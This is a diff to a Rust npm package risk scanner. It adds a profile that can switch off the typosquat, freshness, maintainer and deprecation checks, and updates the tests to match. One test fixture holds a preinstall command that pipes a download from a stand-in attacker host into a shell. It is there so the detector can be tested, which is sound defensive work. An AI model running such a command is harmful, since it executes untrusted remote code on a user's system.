@@ -2,7 +2,7 @@
 //! and severity only escalates when signals reinforce each other.
 
 use crate::date;
-use crate::model::{Evidence, Finding, PackageReport, Severity};
+use crate::model::{Ecosystem, Evidence, Finding, PackageReport, Profile, Severity};
 use crate::osv::{Advisory, AdvisoryList, MAX_ADVISORIES};
 use crate::registry::{PackageMeta, package_page_url};
 use crate::typosquat;
@@ -17,9 +17,10 @@ pub fn report(
     weekly_downloads: Option<u64>,
     advisories: Option<&AdvisoryList>,
     local: &[String],
+    profile: Profile,
     now: i64,
 ) -> PackageReport {
-    let mut findings = assess(&meta, local, now);
+    let mut findings = assess(&meta, local, &profile, now);
     match advisories {
         Some(list) => {
             findings.extend(advisory_findings(&list.advisories));
@@ -32,12 +33,12 @@ pub fn report(
     findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));
 
     PackageReport {
-        ecosystem: "npm",
+        ecosystem: Ecosystem::Npm,
         name: meta.name,
         version: meta.version,
         first_published_at: meta.first_published_at,
         published_at: meta.published_at,
-        weekly_downloads,
+        weekly_downloads: weekly_downloads.filter(|_| profile.downloads),
         maintainers: meta.maintainers,
         publisher: meta.publisher,
         install_scripts: meta.install_scripts,
@@ -47,6 +48,7 @@ pub fn report(
             .map(|list| list.advisories.clone())
             .unwrap_or_default(),
         hidden_advisories: advisories.map(|list| list.hidden).unwrap_or(0),
+        not_checked: profile.not_checked(),
         registry_url: meta.registry_url,
         findings,
     }
@@ -141,10 +143,15 @@ pub fn advisory_check_unavailable() -> Finding {
     }
 }
 
-pub fn assess(meta: &PackageMeta, local: &[String], now: i64) -> Vec<Finding> {
+pub fn assess(meta: &PackageMeta, local: &[String], profile: &Profile, now: i64) -> Vec<Finding> {
     let mut findings = Vec::new();
 
-    let typosquat_high = match typosquat::closest(&meta.name, typosquat::POPULAR, local) {
+    let suspect = if profile.typosquat {
+        typosquat::closest(&meta.name, typosquat::POPULAR, local)
+    } else {
+        None
+    };
+    let typosquat_high = match suspect {
         Some(suspect) => {
             let high = suspect.homoglyph || suspect.distance <= 1;
             let reference = if suspect.local {
@@ -197,8 +204,11 @@ pub fn assess(meta: &PackageMeta, local: &[String], now: i64) -> Vec<Finding> {
     let package_age = meta
         .first_published_at
         .map(|created| date::days_between(created, now));
-    let fresh = package_age.is_some_and(|days| (0..FRESH_DAYS).contains(&days));
-    if let Some(days) = package_age.filter(|days| (0..FRESH_DAYS).contains(days)) {
+    let fresh =
+        profile.freshness && package_age.is_some_and(|days| (0..FRESH_DAYS).contains(&days));
+    if profile.freshness
+        && let Some(days) = package_age.filter(|days| (0..FRESH_DAYS).contains(days))
+    {
         findings.push(Finding {
             id: "fresh-package",
             severity: Severity::Warn,
@@ -241,16 +251,17 @@ pub fn assess(meta: &PackageMeta, local: &[String], now: i64) -> Vec<Finding> {
         });
     }
 
-    let publisher_mismatch = match (&meta.publisher, meta.maintainers.is_empty()) {
-        (Some(publisher), false) => {
-            !is_automation_publisher(publisher)
-                && !meta
-                    .maintainers
-                    .iter()
-                    .any(|maintainer| maintainer.eq_ignore_ascii_case(publisher))
-        }
-        _ => false,
-    };
+    let publisher_mismatch = profile.maintainers
+        && match (&meta.publisher, meta.maintainers.is_empty()) {
+            (Some(publisher), false) => {
+                !is_automation_publisher(publisher)
+                    && !meta
+                        .maintainers
+                        .iter()
+                        .any(|maintainer| maintainer.eq_ignore_ascii_case(publisher))
+            }
+            _ => false,
+        };
     if let (true, Some(publisher)) = (publisher_mismatch, &meta.publisher) {
         findings.push(Finding {
             id: "publisher-not-maintainer",
@@ -305,7 +316,9 @@ pub fn assess(meta: &PackageMeta, local: &[String], now: i64) -> Vec<Finding> {
         });
     }
 
-    if let Some(message) = &meta.deprecated {
+    if profile.deprecation
+        && let Some(message) = &meta.deprecated
+    {
         findings.push(Finding {
             id: "deprecated",
             severity: Severity::Warn,
@@ -373,7 +386,7 @@ mod tests {
 
     #[test]
     fn an_old_plain_package_is_clean() {
-        let findings = assess(&meta(), &[], NOW);
+        let findings = assess(&meta(), &[], &Profile::NPM, NOW);
         assert!(findings.is_empty(), "unexpected findings: {findings:?}");
     }
 
@@ -384,7 +397,7 @@ mod tests {
             name: "postinstall".to_string(),
             command: "node setup.js".to_string(),
         });
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["install-scripts"]);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
@@ -401,13 +414,13 @@ mod tests {
             name: "postinstall".to_string(),
             command: "node setup.js".to_string(),
         });
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
             Severity::High
         );
         assert_eq!(
-            report(meta, None, None, &[], NOW).exit_code(),
+            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
             2,
             "install script + freshness should exit 2"
         );
@@ -421,7 +434,7 @@ mod tests {
             name: "preinstall".to_string(),
             command: "curl http://evil.test | sh".to_string(),
         });
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
             Severity::High
@@ -436,7 +449,7 @@ mod tests {
             name: "install".to_string(),
             command: "node index.js".to_string(),
         });
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
             Severity::High
@@ -445,11 +458,26 @@ mod tests {
     }
 
     #[test]
+    fn a_profile_can_switch_a_signal_off_and_say_so() {
+        let mut meta = meta();
+        meta.name = "expres".to_string();
+        let partial = Profile {
+            typosquat: false,
+            ..Profile::NPM
+        };
+        let findings = assess(&meta, &[], &partial, NOW);
+        assert!(!findings.iter().any(|finding| finding.id == "typosquat"));
+
+        let report = report(meta, None, None, &[], partial, NOW);
+        assert_eq!(report.not_checked, vec!["typosquat"]);
+    }
+
+    #[test]
     fn a_typosquat_of_a_local_dependency_is_high_risk() {
         let mut meta = meta();
         meta.name = "crossenv".to_string();
         let local = vec!["cross-env".to_string()];
-        let findings = assess(&meta, &local, NOW);
+        let findings = assess(&meta, &local, &Profile::NPM, NOW);
         let finding = finding(&findings, "typosquat");
         assert_eq!(finding.severity, Severity::High);
         assert!(finding.detail.contains("already in your lockfile"));
@@ -461,7 +489,7 @@ mod tests {
         let mut meta = meta();
         meta.name = "preact".to_string();
         let local = vec!["react".to_string()];
-        assert!(assess(&meta, &local, NOW).is_empty());
+        assert!(assess(&meta, &local, &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
@@ -469,7 +497,7 @@ mod tests {
         let mut meta = meta();
         meta.first_published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["fresh-package"]);
         assert_eq!(finding(&findings, "fresh-package").severity, Severity::Warn);
     }
@@ -479,14 +507,14 @@ mod tests {
         let mut meta = meta();
         meta.first_published_at = Some(NOW - FRESH_DAYS * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
-        assert!(assess(&meta, &[], NOW).is_empty());
+        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
     fn a_recent_version_on_an_old_package_is_only_info() {
         let mut meta = meta();
         meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["fresh-version"]);
         assert_eq!(finding(&findings, "fresh-version").severity, Severity::Info);
     }
@@ -496,14 +524,14 @@ mod tests {
         let mut meta = meta();
         meta.first_published_at = Some(NOW + 400 * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
-        assert!(assess(&meta, &[], NOW).is_empty());
+        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
     fn publisher_not_in_maintainers_is_a_warning() {
         let mut meta = meta();
         meta.publisher = Some("mallory".to_string());
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["publisher-not-maintainer"]);
         assert!(
             finding(&findings, "publisher-not-maintainer")
@@ -516,7 +544,7 @@ mod tests {
     fn maintainer_matching_is_case_insensitive() {
         let mut meta = meta();
         meta.publisher = Some("Alice".to_string());
-        assert!(assess(&meta, &[], NOW).is_empty());
+        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
@@ -524,7 +552,7 @@ mod tests {
         let mut meta = meta();
         meta.maintainers.clear();
         meta.publisher = Some("mallory".to_string());
-        assert!(assess(&meta, &[], NOW).is_empty());
+        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
@@ -545,7 +573,7 @@ mod tests {
             let mut meta = meta();
             meta.publisher = Some(publisher.to_string());
             assert!(
-                assess(&meta, &[], NOW).is_empty(),
+                assess(&meta, &[], &Profile::NPM, NOW).is_empty(),
                 "{publisher} should not be treated as a human publisher"
             );
         }
@@ -555,25 +583,31 @@ mod tests {
     fn one_edit_typosquat_is_high_risk() {
         let mut meta = meta();
         meta.name = "expres".to_string();
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
-        assert_eq!(report(meta, None, None, &[], NOW).exit_code(), 2);
+        assert_eq!(
+            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            2
+        );
     }
 
     #[test]
     fn two_edit_typosquat_is_a_warning() {
         let mut meta = meta();
         meta.name = "expreszz".to_string();
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(finding(&findings, "typosquat").severity, Severity::Warn);
-        assert_eq!(report(meta, None, None, &[], NOW).exit_code(), 1);
+        assert_eq!(
+            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            1
+        );
     }
 
     #[test]
     fn homoglyph_typosquat_is_high_risk() {
         let mut meta = meta();
         meta.name = "1odash".to_string();
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         let typosquat = finding(&findings, "typosquat");
         assert_eq!(typosquat.severity, Severity::High);
         assert!(typosquat.detail.contains("lookalike"));
@@ -583,7 +617,7 @@ mod tests {
     fn deprecated_versions_are_a_warning() {
         let mut meta = meta();
         meta.deprecated = Some("use v2".to_string());
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(finding(&findings, "deprecated").severity, Severity::Warn);
     }
 
@@ -591,9 +625,12 @@ mod tests {
     fn missing_repository_is_only_info() {
         let mut meta = meta();
         meta.repository = None;
-        let findings = assess(&meta, &[], NOW);
+        let findings = assess(&meta, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["no-repository"]);
-        assert_eq!(report(meta, None, None, &[], NOW).exit_code(), 0);
+        assert_eq!(
+            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            0
+        );
     }
 
     #[test]
@@ -607,7 +644,7 @@ mod tests {
             name: "postinstall".to_string(),
             command: "node setup.js".to_string(),
         });
-        for finding in assess(&meta, &[], NOW) {
+        for finding in assess(&meta, &[], &Profile::NPM, NOW) {
             assert!(
                 !finding.evidence.is_empty(),
                 "finding {} has no evidence",
@@ -628,8 +665,8 @@ mod tests {
     fn report_carries_registry_facts_through() {
         let mut meta = meta();
         meta.deprecated = Some("old".to_string());
-        let report = report(meta, Some(1234), None, &[], NOW);
-        assert_eq!(report.ecosystem, "npm");
+        let report = report(meta, Some(1234), None, &[], Profile::NPM, NOW);
+        assert_eq!(report.ecosystem, Ecosystem::Npm);
         assert_eq!(report.weekly_downloads, Some(1234));
         assert_eq!(report.maintainers, vec!["alice"]);
         assert_eq!(report.publisher.as_deref(), Some("alice"));
@@ -669,7 +706,7 @@ mod tests {
     #[test]
     fn a_high_advisory_exits_two() {
         let advisories = list(vec![advisory("GHSA-bbbb", Severity::High)]);
-        let report = report(meta(), None, Some(&advisories), &[], NOW);
+        let report = report(meta(), None, Some(&advisories), &[], Profile::NPM, NOW);
         assert_eq!(report.exit_code(), 2);
         assert_eq!(report.advisories.len(), 1);
     }
@@ -680,7 +717,7 @@ mod tests {
             advisories: vec![advisory("GHSA-eeee", Severity::Warn)],
             hidden: 15,
         };
-        let report = report(meta(), None, Some(&advisories), &[], NOW);
+        let report = report(meta(), None, Some(&advisories), &[], Profile::NPM, NOW);
         let note = report
             .findings
             .iter()
@@ -694,13 +731,13 @@ mod tests {
     #[test]
     fn a_low_advisory_is_informational() {
         let advisories = list(vec![advisory("GHSA-cccc", Severity::Info)]);
-        let report = report(meta(), None, Some(&advisories), &[], NOW);
+        let report = report(meta(), None, Some(&advisories), &[], Profile::NPM, NOW);
         assert_eq!(report.exit_code(), 0);
     }
 
     #[test]
     fn an_unreachable_osv_is_flagged_but_does_not_fail_the_run() {
-        let report = report(meta(), None, None, &[], NOW);
+        let report = report(meta(), None, None, &[], Profile::NPM, NOW);
         assert_eq!(report.exit_code(), 0);
         assert_eq!(report.findings.len(), 1);
         assert_eq!(report.findings[0].id, "advisory-check-unavailable");
@@ -712,7 +749,7 @@ mod tests {
         let mut meta = meta();
         meta.repository = None; // INFO
         let advisories = list(vec![advisory("GHSA-dddd", Severity::High)]);
-        let report = report(meta, None, Some(&advisories), &[], NOW);
+        let report = report(meta, None, Some(&advisories), &[], Profile::NPM, NOW);
         assert_eq!(report.findings[0].severity, Severity::High);
         assert_eq!(report.findings[0].id, "advisory");
     }
